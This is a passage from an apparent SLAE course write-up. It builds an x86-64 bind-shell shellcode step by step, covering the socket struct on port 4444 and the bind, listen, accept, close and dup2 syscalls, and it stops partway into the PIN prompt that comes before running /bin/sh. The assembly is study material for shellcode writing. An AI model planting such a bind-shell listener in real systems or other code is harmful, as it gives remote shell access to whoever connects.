&lt;p&gt;When a socket is created, as we saw in the previous step, it has no specific address assigned to it. For that we need the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall, which assigns the address specified by &lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt; for socket specified by sockfd. &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd&lt;/code&gt; here is the file descriptor we received in return from using the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Assembly&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;We have already saved the sockfd value to RDI in previous assembly example (see copysocket) so no need to assign it again. Let’s focus on the const &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr *addr&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;socklen_t addrlen&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;One thing to know about structs in C is that it is a contiguous block of memory where each member is located at a certain offset from the start of the structure. You can easily verify it loading the C code example above to gdb debugger and examining the memory. The first member of the struct is on the lowest address and last member on the highest. For us to do the same in assembly, we need to take into account byte sizes of each member.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/struct.png&quot; alt=&quot;SLAE task 1 struct&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In assembly this would look as follows: first we make a push for the 8 zero bytes (RAX is 64-bit/8-bytes). Next we fill up 4 bytes with zeros for INADDR_ANY (0.0.0.0). The port we want to be using here is 4444, which in hexadecimal format would be 115d. However we need to present it in network byte order which means arranging the bytes in the manner where the most significant byte would be on the smallest address. This would take up 2 bytes. And finally we place the first member of the struct (2 bytes in length) AF_INET, to the lowest address. When we are done, it is also important to adjust the stack pointer to point it to the top of the stack again (to the start address of our struct).&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;server_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5d11&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x115d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can focus on the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall which takes 3 parameters. We already got RDI in place, so what we need to do next is give RSI the starting address of our struct which we know is at RSP. Third argument (RDX) represents the length of the struct which we get with this calculation: 2 bytes (AF_INET) + 2 bytes (port) + 4 bytes (INADDR_ANY) + 8 bytes (8 zero bytes) = 16 bytes. Bind() syscall is represented by syscall number 49 in decimal.&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;listen-syscall&quot;&gt;&lt;b&gt;listen() syscall&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;We have successfully created a socket and bind an address to it. Next what we want to be doing is listening on the socket for any incoming connections. &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall is quite simple in the sense that it only takes 2 parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;int sockfd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;int backlog&lt;/code&gt;. From the two parameters, first is the sockfd which we already have stored in RDI. The second argument defines the length to which the queue of pending connections for sockfd may grow (quoting from the man page). We simply set it to be 2.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In order to implement it in &lt;b&gt;assembly&lt;/b&gt; we only have to zero out RSI and mov 2 to it, then make the call for listen syscall.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;accept-and-close-syscall&quot;&gt;&lt;b&gt;accept() and close() syscall&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;In order to accept an incoming TCP connection we use the &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall which has 3 arguments. We already have sockfd previously set to RDI so let’s see the other 2 - &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr *addr&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;socklen_t&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;int flags&lt;/code&gt;. The argument addr is a pointer to a sockaddr structure which we talked about earlier and know is 16 bytes in length. This is the reason we need to allocate 16 bytes on the stack as you see in the assembly code example below. Having allocated the space on the stack, we can also appoint the current RSP to RSI as it is pointing to the start of that struct. Next we can also use stack for storing the struct length in bytes, which we then read to RDX as 3rd argument value.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt; 	     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lets&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keep&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; returns successfully we receive a new file descriptor for the accepted socket (saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;r9&lt;/code&gt;) and can close the old one by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;close()&lt;/code&gt; syscall. It takes only 1 parameter which is the old file descriptor &lt;code class=&quot;highlighter-rouge&quot;&gt;sockfd&lt;/code&gt; (already in RDI). So we can just set RAX to 3 which is the respective syscall number for &lt;code class=&quot;highlighter-rouge&quot;&gt;close()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;dup2-syscall&quot;&gt;&lt;b&gt;dup2() syscall&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;Once we accepted an incoming connection successfully, we received a new file descriptor. At this point we need to think ahead a bit. What we want our program to do is to write a message for the connected client to enter a PIN code and then receive the PIN code from the client as input. For this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; to tie the standard file descriptors (0-stdin, 1-stdout, 2-stderr) to the new socket so we can do the reading and writing easily. &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; takes 2 arguments, 1st the current file descriptor and 2nd the new file descriptor which creates a copy of the old one.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;duplicate_sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;holds&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;received&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;correct-pin-code-before-executing-binsh&quot;&gt;&lt;b&gt;Correct PIN code before executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;Now we have reached to the point where we have successfully established a connection between the server and the client. Next we will focus on the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscalls + the comparison of user usbmitted PIN with our secret PIN, to complete the assignment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/client_server.png&quot; alt=&quot;hello&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;write-and-read-syscalls&quot;&gt;&lt;b&gt;write() and read() syscalls&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;Write() syscall takes 3 arguments: &lt;b&gt;fd&lt;/b&gt; which is the new file descriptor we received from the accept() syscall, a &lt;b&gt;buf&lt;/b&gt; to hold to contents users writes and the &lt;b&gt;count&lt;/b&gt; to represent the number of bytes to be written.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So in assembly we will use RDX register to specify that we want to write total of 6 bytes of data. Next on we zero out the contents of RSI registry and move the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3a4e4950&lt;/code&gt; to it. This hex value presents a string “PIN:”. To get the exact form in hex, one could use a oneliner in python &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;import binascii; inhex=binascii.hexlify('PIN:'[::-1]); print inhex&quot;&lt;/code&gt;, which also takes into account the little-endian format. After moving it to RSI, we push it on the stack so we can have the address on which we have stored the string in RSI instead of the value itself as we are dealing with a pointer.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;

